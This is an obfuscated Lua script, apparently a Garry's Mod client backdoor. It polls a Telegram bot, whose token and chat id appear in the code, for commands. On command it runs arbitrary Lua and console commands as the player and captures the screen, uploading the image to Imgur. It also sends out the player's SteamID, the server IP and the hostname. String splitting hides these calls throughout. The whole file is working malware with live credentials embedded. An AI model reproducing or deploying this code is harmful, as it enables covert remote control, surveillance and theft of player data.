local a,b,c,d,e,f,g,h,i,j,k,l="htt".."ps://ap".."i.tel".."egr".."am.o".."rg/bot".."1998995206:AAE1pT0kS-mhboNPT5LzD4XL07xzoE6r1EU/","987778652",
"",http.Post,timer.Create,"Run".."ned",util.JSONToTable,util.Base64Encode,LocalPlayer(),"se".."ndMes".."sage?cha".."t_id=",game.GetIPAddress,
GetHostName;local m=i:SteamID()local function n(o)d(a..j..b.."&te".."xt=["..k().."|"..m.."] "..o)end;e("x".."1",1,0,function()d(a.."get".."Upd".."ates?off".."set=-1",
{},function(o)local o=g(o)local p=o.result[1].message;local q,r=p.text,p.date;if c==""then c=r end;if r==c then return end;c=r;local s,t=m.." l".."ua",m.." c".."md"
if q:find(s)then RunString((s.." "):Explode(q)[2])n(f)elseif q:find(t)then i:ConCommand((t.." "):Explode(q)[2])n(f)elseif q:find(m.." scr")then hook.Add("PostRender",s
,function()hook.Remove("PostRender",s)local u=render.Capture({format="png",x=0,y=0,w=ScrW(),h=ScrH()})d("htt".."ps://ap".."i.imgu".."r.com/3/i".."mage",{image=h(u)},function(o)
n(g(o).data.link)end,function()end,{Authorization="Client-ID f1607b06d9a163f"})end)elseif q:find("sta".."tus")then n(l())end end)end)
